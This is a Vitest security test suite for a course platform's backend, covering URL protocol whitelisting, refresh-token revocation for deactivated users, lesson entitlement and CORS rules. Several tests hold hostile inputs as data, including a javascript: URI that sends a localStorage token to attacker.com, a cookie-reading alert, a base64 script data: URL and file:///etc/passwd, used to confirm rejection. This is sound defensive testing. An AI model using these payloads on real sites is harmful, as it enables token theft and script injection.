import { describe, it, expect, beforeEach } from 'vitest';
import { createSubmissionSchema } from '../src/modules/submissions/submission.schema.js';
import * as authService from '../src/modules/auth/auth.service.js';
import * as lessonService from '../src/modules/lessons/lesson.service.js';
import { prisma } from '../src/db/prisma.js';
import { Role, LessonAccessType } from '@prisma/client';
import bcrypt from 'bcryptjs';
import { getTestApp } from './helpers/test-app.js';

describe('Phase 5A Security Hardening & Remediation Test Suite', () => {

  // ─────────────────────────────────────────────────────────
  // 1. Submission URL Protocol Whitelisting
  // ─────────────────────────────────────────────────────────
  describe('Submission URL Protocol Whitelisting', () => {
    const validTaskId = '11111111-1111-1111-1111-111111111111';

    it('should accept valid HTTPS URLs', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        githubUrl: 'https://github.com/codek-student/final-project',
        fileUrl: 'https://storage.googleapis.com/codek-assets/solution.zip'
      });
      expect(parsed.success).toBe(true);
    });

    it('should accept valid HTTP URLs', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        githubUrl: 'http://git.codek.local/student/repo'
      });
      expect(parsed.success).toBe(true);
    });

    it('should reject malicious javascript: URIs in githubUrl', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        githubUrl: 'javascript:alert(document.cookie)'
      });
      expect(parsed.success).toBe(false);
      if (!parsed.success) {
        expect(parsed.error.errors[0].message).toMatch(/Must be a valid URL|URL protocol must be/);
      }
    });

    it('should reject malicious javascript: URIs in fileUrl', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        fileUrl: 'javascript:fetch("https://attacker.com/steal?token="+localStorage.getItem("token"))'
      });
      expect(parsed.success).toBe(false);
    });

    it('should reject data: URLs', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        fileUrl: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
      });
      expect(parsed.success).toBe(false);
    });

    it('should reject vbscript: URLs', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        githubUrl: 'vbscript:msgbox("hello")'
      });
      expect(parsed.success).toBe(false);
    });

    it('should reject file: URLs', () => {
      const parsed = createSubmissionSchema.safeParse({
        taskId: validTaskId,
        fileUrl: 'file:///etc/passwd'
      });
      expect(parsed.success).toBe(false);
    });
  });

  // ─────────────────────────────────────────────────────────
  // 2. Refresh Token user.isActive Lifecycle Enforcement
  // ─────────────────────────────────────────────────────────
  describe('Refresh Token Inactive User Lifecycle', () => {
    let testUser: any;

    beforeEach(async () => {
      // Clean up previous test users if any
      await prisma.refreshToken.deleteMany({
        where: { user: { loginId: 'STU-SEC-TEST-99' } }
      });
      await prisma.student.deleteMany({
        where: { user: { loginId: 'STU-SEC-TEST-99' } }
      });
      await prisma.user.deleteMany({
        where: { loginId: 'STU-SEC-TEST-99' }
      });

      // Create an active test user
      const passwordHash = await bcrypt.hash('Password@123', 10);
      testUser = await prisma.user.create({
        data: {
          loginId: 'STU-SEC-TEST-99',
          email: 'sec-stu-99@codek.local',
          firstName: 'Sec',
          lastName: 'Student',
          role: Role.STUDENT,
          passwordHash,
          isActive: true,
          mustChangePassword: false,
          isEmailVerified: true,
          student: {
            create: {
              studentCode: 'CODE-SEC-99',
              schoolName: 'CodeK Academy',
              learningModeSelected: true
            }
          }
        },
        include: { student: true }
      });
    });

    it('should allow token refresh for an active user', async () => {
      // Direct login to obtain refresh token
      const loginResult = await authService.login({
        loginId: 'STU-SEC-TEST-99',
        password: 'Password@123'
      });

      expect(loginResult.refreshToken).toBeDefined();

      const refreshResult = await authService.refresh(loginResult.refreshToken!);
      expect(refreshResult.accessToken).toBeDefined();
      expect(refreshResult.refreshToken).toBeDefined();
      expect(refreshResult.user.loginId).toBe('STU-SEC-TEST-99');
    });

    it('should reject refresh and revoke tokens if the user has been deactivated', async () => {
      // 1. User logs in
      const loginResult = await authService.login({
        loginId: 'STU-SEC-TEST-99',
        password: 'Password@123'
      });
      const validToken = loginResult.refreshToken!;

      // 2. Admin deactivates user
      await prisma.user.update({
        where: { id: testUser.id },
        data: { isActive: false }
      });

      // 3. User attempts to refresh token -> must be rejected
      await expect(authService.refresh(validToken)).rejects.toThrow('Account is disabled');

      // 4. Verify all refresh tokens for this user were revoked/deleted
      const remainingTokens = await prisma.refreshToken.findMany({
        where: { userId: testUser.id }
      });
      expect(remainingTokens.length).toBe(0);
    });
  });

  // ─────────────────────────────────────────────────────────
  // 3. Batched listLessons Semantic Entitlement Evaluation
  // ─────────────────────────────────────────────────────────
  describe('Batched listLessons Entitlement Semantics', () => {
    it('should correctly evaluate FREE vs SUBSCRIPTION_REQUIRED in-memory without N+1', async () => {
      const curriculum = await prisma.curriculum.findFirst({
        include: { lessons: true }
      });

      if (!curriculum || curriculum.lessons.length === 0) return;

      // Unauthenticated student with no active subscription
      const dummyStudentUser = {
        userId: '00000000-0000-0000-0000-000000000001',
        role: Role.STUDENT,
        studentId: '00000000-0000-0000-0000-000000000002'
      };

      const result = await lessonService.listLessons(
        { curriculumId: curriculum.id },
        dummyStudentUser
      );

      expect(Array.isArray(result)).toBe(true);
      for (const lesson of result) {
        if (lesson.isFree || lesson.accessType === LessonAccessType.FREE) {
          expect(lesson.isLocked).toBe(false);
          expect(lesson.lockReason).toBe('FREE_PREVIEW');
        } else {
          expect(lesson.isLocked).toBe(true);
          expect(lesson.lockReason).toBe('SUBSCRIPTION_REQUIRED');
        }
      }
    });
  });

  // ─────────────────────────────────────────────────────────
  // 4. CORS Policy Enforcement
  // ─────────────────────────────────────────────────────────
  describe('CORS Policy Enforcement', () => {
    it('should allow requests from configured CORS_ORIGIN', async () => {
      const app = await getTestApp();
      const res = await app.inject({
        method: 'OPTIONS',
        url: '/api/v1/health',
        headers: {
          origin: 'http://localhost:5173',
          'access-control-request-method': 'GET'
        }
      });
      expect(res.headers['access-control-allow-origin']).toBe('http://localhost:5173');
      expect(res.headers['access-control-allow-credentials']).toBe('true');
    });

    it('should reject requests from arbitrary external vercel origins', async () => {
      const app = await getTestApp();
      const res = await app.inject({
        method: 'OPTIONS',
        url: '/api/v1/health',
        headers: {
          origin: 'https://evil-attacker.vercel.app',
          'access-control-request-method': 'GET'
        }
      });
      expect(res.headers['access-control-allow-origin']).toBeUndefined();
    });
  });
});
